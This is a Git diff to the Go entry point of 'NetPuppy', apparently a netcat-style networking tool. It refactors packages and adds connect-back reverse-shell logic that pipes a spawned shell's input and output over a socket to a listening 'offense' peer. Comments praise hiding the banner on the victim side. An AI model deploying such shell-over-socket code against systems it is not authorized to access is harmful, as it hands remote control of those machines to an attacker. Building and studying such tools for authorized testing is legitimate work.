@@ -12,15 +12,17 @@ import (
 	"time"
 
 	// NetPuppy pkgs:
+	"netpuppy/cmd/conn"
+	"netpuppy/cmd/shell"
 	"netpuppy/utils"
 )
 
-func Run(c utils.ConnectionGetter) {
+func Run(c conn.ConnectionGetter) {
 	// Parse flags from user, attach to struct:
 	flagStruct := utils.GetFlags()
 
 	// Create peer instance based on user input:
-	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
+	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
 
 	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
 	if !thisPeer.Shell {
@@ -32,29 +34,32 @@ func Run(c utils.ConnectionGetter) {
 	}
 
 	// Make connection:
-	var socketInterface utils.SocketInterface
+	var socketInterface conn.SocketInterface
+	//var socketStruct conn.RealSocket
 	if thisPeer.ConnectionType == "offense" {
 		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
+		//socketStruct = socketInterface.(*conn.RealSocket)
 	} else {
 		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
 	}
 
 	// Connect socket connection to peer
-	thisPeer.Connection = socketInterface
+	//thisPeer.Connection = socketInterface
 
 	// If shell flag is true, start shell:
-	var shellInterface utils.ShellInterface
+	var shellInterface shell.ShellInterface
 	var shellErr error
 	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
-		var realShellGetter utils.RealShellGetter
+		var realShellGetter shell.RealShellGetter
 		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()
 		if shellErr != nil {
 			// Send error through socket back to listener peer.
 			socketInterface.Write([]byte(shellErr.Error()))
+			socketInterface.Close()
 			os.Exit(1)
 		}
 		// Connect shell to peer:
-		thisPeer.ShellProcess = shellInterface
+		//thisPeer.ShellProcess = shellInterface
 	}
 
 	// Update banner w/ missing port:
@@ -62,19 +67,90 @@ func Run(c utils.ConnectionGetter) {
 	// fmt.Println(missingPortInBanner)
 
 	// Start SIGINT go routine & start channel to listen for SIGINT:
-	listenForSIGINT(thisPeer)
+	listenForSIGINT(socketInterface, thisPeer)
 
 	// If we are the connect-back peer & the user wants a shell, start the shell here:
 	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
 		// Use type-assertion to uncover the actual socket from the interface:
-		realSocket := socketInterface.(*utils.RealSocket)
+
+		// Get readers & writers for shell & socket to give to io.Copy:
+		socketReader := socketInterface.GetReader()
+		socketWriter := socketInterface.GetWriter()
+
+		stdoutReader, er_ := shellInterface.GetStdoutReader()
+		if er_ != nil {
+			socketInterface.Write([]byte(er_.Error()))
+			socketInterface.Close()
+			os.Exit(1)
+		}
+
+		stderrReader, e_r := shellInterface.GetStderrReader()
+		if e_r != nil {
+			socketInterface.Write([]byte(e_r.Error()))
+			socketInterface.Close()
+			os.Exit(1)
+		}
+
+		stdinWriter, _rr := shellInterface.GetStdinWriter()
+		if _rr != nil {
+			socketInterface.Write([]byte(_rr.Error()))
+			socketInterface.Close()
+			os.Exit(1)
+		}
 
 		// Start the shell:
-		err := thisPeer.ShellProcess.StartShell(realSocket)
+		err := shellInterface.StartShell()
 		if err != nil {
 			// Since we have the socket, send the error thru the socket then quit (ooh sneaky!):
-			realSocket.Write([]byte(err.Error()))
+			socketInterface.Write([]byte(err.Error()))
+			socketInterface.Close()
 			os.Exit(1)
+		}
+
+		// Start go routines to connect pipes & move data:
+		var routineErr error
+		var commandPending bool = false
+
+		go func(stdout *io.ReadCloser, socket *io.Writer) {
+			_, err := io.Copy(*socket, *stdout)
+			if err != nil {
+				routineErr = fmt.Errorf("Error copying stdout to socket: %v\n", err)
+				return
+			}
+			commandPending = false
+		}(stdoutReader, socketWriter)
+
+		go func(stderr *io.ReadCloser, socket *io.Writer) {
+			_, err := io.Copy(*socket, *stderr)
+			if err != nil {
+				routineErr = fmt.Errorf("Error copying stderr to socket: %v\n", err)
+				return
+			}
+			commandPending = false
+		}(stderrReader, socketWriter)
+
+		go func(socket *io.Reader, stdin *io.WriteCloser) {
+			commandPending = true
+			_, err := io.Copy(*stdin, *socket)
+			if err != nil {
+				routineErr = fmt.Errorf("Error copying socket to stdin: %v\n", err)
+				return
+			}
+		}(socketReader, stdinWriter)
+
+		// For loop which checks for an error captured in go routines.
+		//...... If there is no error, then a small timeout prevents the process from lagging:
+		for {
+			if routineErr != nil {
+				// Send the error msg down the socket, then exit quitely:
+				socketInterface.Write([]byte(routineErr.Error()))
+				os.Exit(1)
+			}
+
+			if commandPending {
+				// Timeout:
+				time.Sleep(69 * time.Millisecond)
+			}
 		}
 	} else {
 		// Go routines to read user input:
@@ -89,7 +165,7 @@ func Run(c utils.ConnectionGetter) {
 			}
 		}
 
-		readSocket := func(socketInterface utils.SocketInterface, c chan<- []byte) {
+		readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte) {
 			// Read data in socket:
 			for {
 				dataReadFromSocket, err := socketInterface.Read()
@@ -114,7 +190,7 @@ func Run(c utils.ConnectionGetter) {
 		}
 
 		// Write go routines
-		writeToSocket := func(data string, socketInterface utils.SocketInterface) {
+		writeToSocket := func(data string, socketInterface conn.SocketInterface) {
 			// Check length so we can clear channel, but not send blank data:
 			if len(data) > 0 {
 				_, erR := socketInterface.Write([]byte(data))
@@ -162,7 +238,7 @@ func Run(c utils.ConnectionGetter) {
 	}
 }
 
-func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
+func listenForSIGINT(connection conn.SocketInterface, thisPeer *conn.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
 	// If SIGINT: close connection, exit w/ code 2
 	signalChan := make(chan os.Signal, 1)
 	signal.Notify(signalChan, os.Interrupt)
@@ -173,7 +249,7 @@ func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by referen
 				if !thisPeer.Shell {
 					fmt.Printf("signal: %v\n", sig)
 				}
-				thisPeer.Connection.Close()
+				connection.Close()
 				os.Exit(2)
 			}
 		}
